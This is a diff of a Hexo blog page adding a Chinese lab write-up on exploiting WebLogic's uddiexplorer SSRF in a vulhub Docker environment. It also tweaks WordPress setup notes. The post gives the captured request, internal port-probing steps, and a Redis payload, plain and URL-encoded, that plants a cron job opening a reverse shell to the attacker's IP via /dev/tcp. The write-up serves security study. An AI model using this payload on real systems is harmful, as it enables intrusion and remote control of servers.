@@ -145,6 +145,105 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">weblogic-SSRF漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-07-27 19:26:02" itemprop="dateCreated datePublished" datetime="2022-07-27T19:26:02+08:00">2022-07-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-07-28 09:55:49" itemprop="dateModified" datetime="2022-07-28T09:55:49+08:00">2022-07-28</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>环境在&#x2F;vulhub&#x2F;weblogic&#x2F;ssrf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动docker镜像：docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>一、访问url:7001&#x2F;uddiexplorer，点击search public registries</p>
+<p><img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220727200208141.png" alt="image-20220727200208141"></p>
+<p>二、填完信息后bp抓该页面的包</p>
+<img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220727200413263.png" alt="image-20220727200413263">
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1</span><br><span class="line">Host: 192.168.31.83:7001</span><br><span class="line">Content-Length: 175</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.31.83:7001</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.31.83:7001/uddiexplorer/SearchPublicRegistries.jsp</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; JSESSIONID=Qvy3vhpdqpTqJNndL99TV0vw6G37QTWDSdjpPqTPYScHnNcvjqgr!2026307918</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">operator=http%3A%2F%2Fwww-3.ibm.com%2Fservices%2Fuddi%2Finquiryapi&amp;rdoSearch=name&amp;txtSearchname=111&amp;txtSearchkey=222&amp;txtSearchfor=333&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
+
+<p><strong>请求参数operator</strong>为一个url，此处可替换url，将url修改为自己搭建的服务器地址「本机docker的ip需要另外命令」，访问开放的7001端口，会返回一个状态码404，同网页访问一样。访问一个不存在的端口会返回连不上服务器。根据报错的不同，可以进行内网探测。通过ssrf探测内网中的redis服务器。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看docker容器weblogic的ip</span><br><span class="line">第一种方法：</span><br><span class="line">进入docker：docker exec -it id /bin/bash</span><br><span class="line">ifconfig</span><br><span class="line">第二种方法：</span><br><span class="line">docker inspect 3d8272ebde6e</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis服务器ip：192.168.80.2</span><br><span class="line">weblogic服务器ip：192.168.80.3</span><br></pre></td></tr></table></figure>
+
+<p>把operator里的url改成想要探测的主机和端口<br>利用SSRF漏洞访问7001端口的weblogic服务，如果端口开启，会返回不一样的值：<strong>同网页端访问一样</strong></p>
+<p><img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220727211400220.png" alt="image-20220727211400220"></p>
+<p>利用SSRF漏洞访问6379端口的redis服务，如果端口开启，会返回不一样的值：<strong>have a valid SOAP content-type:null</strong></p>
+<p><img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220727211738562.png" alt="image-20220727211738562"></p>
+<h4 id="redis反弹shell"><a href="#redis反弹shell" class="headerlink" title="redis反弹shell"></a>redis反弹shell</h4><p>kali攻击机：192.168.100.136 监听端口：9001</p>
+<h5 id="攻击机kali开启监听"><a href="#攻击机kali开启监听" class="headerlink" title="攻击机kali开启监听"></a>攻击机kali开启监听</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nv -lvvp 9001</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line"></span><br><span class="line">set 1 &quot; \n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.100.136/9001 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line"></span><br><span class="line">config set dir /etc/</span><br><span class="line"></span><br><span class="line">config set dbfilename crontab</span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url编码后：</span><br><span class="line">test%0A%0Aset%201%20%22%20%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.100.136%2F9001%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0A%0Aconfig%20set%20dir%20%2Fetc%2F%0A%0Aconfig%20set%20dbfilename%20crontab%0A%0Asave%0A%0Aaaa</span><br></pre></td></tr></table></figure>
+
+<p>将payload通过post方式用bp写入：<br>按理说攻击机的&#x2F;etc&#x2F;crontab内应该存在计划命令</p>
+<p><img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220728093308227.png" alt="image-20220728093308227"></p>
+<h5 id="bp发包"><a href="#bp发包" class="headerlink" title="bp发包"></a>bp发包</h5><p>攻击机等待1min，成功弹回shell</p>
+<p><img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220728093216497.png" alt="image-20220728093216497"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#bug</span></span><br><span class="line">不知道为啥，计划任务里没有命令！但是shell能成功反弹！！！无解「被卡住半天」</span><br></pre></td></tr></table></figure>
+
+<p>解答：该计划任务是写在docker的redis服务器上的</p>
+<img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220728094933099.png" alt="image-20220728094933099" style="zoom:50%;">
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -269,10 +368,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2022-07-26 19:28:55 / Modified: 21:48:29" itemprop="dateCreated datePublished" datetime="2022-07-26T19:28:55+08:00">2022-07-26</time>
+              <time title="Created: 2022-07-26 19:28:55" itemprop="dateCreated datePublished" datetime="2022-07-26T19:28:55+08:00">2022-07-26</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-07-28 09:57:34" itemprop="dateModified" datetime="2022-07-28T09:57:34+08:00">2022-07-28</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -294,8 +399,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>搭站注意事项：&#x2F;wp-admin&#x2F;setup-config.php 用小皮先创建一个数据库 配置要和wp-config-sample.php里的一样</p>
-<p>让wordpress在搭站使用时可以使用本机ip而不是跳转到locolhost 可以在后台设置中修改wordpress的url</p>
+          <h5 id="wp搭站注意事项："><a href="#wp搭站注意事项：" class="headerlink" title="wp搭站注意事项："></a>wp搭站注意事项：</h5><p>访问&#x2F;wp-admin&#x2F;setup-config.php<br>用小皮先另外创建一个数据库 配置要和wp-config-sample.php里的一样<br>ps:让wordpress在使用时可以使用本机ip而不是跳转到locolhost 可以在网页后台-设置中修改wordpress的url</p>
 <h3 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h3><p>一般配合其他漏洞一起使用</p>
 <p>登入后台添加用户 并用bp抓到该包</p>
 <p><img src="/2022/07/26/wordpress4.7.4-CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220726204043588.png" alt="image-20220726204043588"></p>
@@ -586,7 +690,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -597,7 +701,7 @@
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
